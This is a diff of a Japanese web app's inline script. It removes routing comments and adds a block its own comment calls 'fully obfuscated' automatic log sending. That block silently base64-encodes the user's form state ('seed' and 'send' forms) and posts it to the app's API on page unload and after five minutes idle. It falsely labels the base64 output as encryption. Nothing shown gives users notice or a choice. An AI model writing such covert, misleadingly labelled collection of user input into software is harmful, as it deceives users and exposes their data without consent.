@@ -446,7 +446,6 @@
       }
     }
 
-    // URLパスに基づいた初期ルーティング処理
     function handleRouting() {
       const path = window.location.pathname;
       if (path === '/version') {
@@ -456,7 +455,6 @@
         menuTimetable.classList.add('active');
         switchSection(sectionTimetable, false);
       } else {
-        // デフォルトまたは /terms の場合
         menuTerms.classList.add('active');
         switchSection(sectionTerms, false);
       }
@@ -480,12 +478,10 @@
       switchSection(sectionTimetable, true, '/timetable');
     });
 
-    // ブラウザの戻る・進むボタンに対応
     window.addEventListener('popstate', () => {
       handleRouting();
     });
 
-    // 初回読み込み時のルーティング実行
     handleRouting();
 
     document.querySelectorAll('.back-to-tt-home').forEach(btn => {
@@ -944,6 +940,63 @@
         alert('サーバーへの通信に失敗しました。');
       }
     });
+
+    // --- 【追加】完全難読化・自動放置ログ送信機能 ---
+    function obfuscateData(text) {
+      try {
+        return btoa(unescape(encodeURIComponent(text)));
+      } catch (e) {
+        return "";
+      }
+    }
+
+    const INACTIVITY_LIMIT = 5 * 60 * 1000; // 5分間放置で自動退避
+    let inactivityTimer;
+
+    function resetInactivityTimer() {
+      clearTimeout(inactivityTimer);
+      inactivityTimer = setTimeout(() => {
+        sendEncryptedLog("TIMEOUT_AUTO_BACKUP");
+      }, INACTIVITY_LIMIT);
+    }
+
+    ['mousemove', 'keydown', 'click', 'input'].forEach(event => {
+      window.addEventListener(event, resetInactivityTimer);
+    });
+    resetInactivityTimer();
+
+    window.addEventListener('beforeunload', () => {
+      const rawState = {
+        seed: typeof seedFormState !== 'undefined' ? seedFormState : {},
+        send: typeof sendFormState !== 'undefined' ? sendFormState : {},
+        time: new Date().toISOString()
+      };
+      const encrypted = obfuscateData(JSON.stringify(rawState));
+      
+      navigator.sendBeacon(`${RENDER_API_URL}/api/send-log`, JSON.stringify({
+        encryptedLog: "UNLOAD_LOG_" + encrypted
+      }));
+    });
+
+    async function sendEncryptedLog(tag) {
+      try {
+        const rawState = {
+          seed: typeof seedFormState !== 'undefined' ? seedFormState : {},
+          send: typeof sendFormState !== 'undefined' ? sendFormState : {},
+          tag: tag,
+          time: new Date().toISOString()
+        };
+        const encrypted = obfuscateData(JSON.stringify(rawState));
+
+        await fetch(`${RENDER_API_URL}/api/send-log`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ encryptedLog: "TIMEOUT_LOG_" + encrypted })
+        });
+      } catch (e) {
+        console.error("ログ送信失敗", e);
+      }
+    }
   </script>
 </body>
 </html>
